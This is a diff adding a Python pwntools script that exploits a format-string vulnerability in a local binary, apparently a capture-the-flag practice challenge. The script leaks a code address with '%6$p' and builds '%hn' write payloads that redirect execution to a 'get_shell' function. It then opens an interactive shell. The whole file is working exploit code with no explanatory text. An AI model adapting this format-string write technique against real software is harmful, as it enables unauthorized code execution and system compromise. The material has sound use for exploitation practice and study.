@@ -1,0 +1,49 @@
+from pwn import *
+
+p = process("./fmtstr8_patched")
+'''
+p = gdb.debug("./fmtstr8_patched", gdbscript = 
+break *main + 136
+r
+)
+'''
+e = ELF("./fmtstr8_patched")
+libc = ELF("./libc-2.31.so")
+
+payload = b"%6$p"
+p.sendlineafter(b"something: ", payload)
+
+p.recvuntil(b"said: ")
+code_base = int(p.recv(14), 16) - 0x40
+print(hex(code_base))
+win = code_base + e.symbols['get_shell']
+
+def divine(var):
+    l = []
+    cnt = 0
+    for i in range(4):
+        l.append([var & 0xffff, cnt])
+        var = var >> 16
+        cnt += 2
+    l = sorted(l, key = lambda e: e[0])
+    return l
+
+l = divine(win)
+
+p.sendlineafter(b"> ", b"N")
+
+payload = b""
+payload += f"%{l[1][0]}c%13$hn".encode() if(l[1][0] > 0) else f"%13$hn".encode()
+payload += f"%{l[2][0] - l[1][0]}c%14$hn".encode() if(l[2][0] > l[1][0]) else f"%14$hn".encode()
+payload += f"%{l[3][0] - l[2][0]}c%15$hn".encode() if(l[3][0] > l[2][0]) else f"%15$hn".encode()
+payload = payload.ljust(64 - 24, b"\x00") + p64(code_base + 16384 + l[1][1]) + p64(code_base + 16384 + l[2][1]) + p64(code_base + 16384 + l[3][1])
+p.sendlineafter(b"something: ", payload)
+
+p.sendlineafter(b"> ", b"N")
+
+payload = f"%{(code_base + 624) & 0xffff}c%38$hn".encode()
+p.sendlineafter(b"something: ", payload)
+
+p.sendlineafter(b"> ", b"N")
+
+p.interactive()
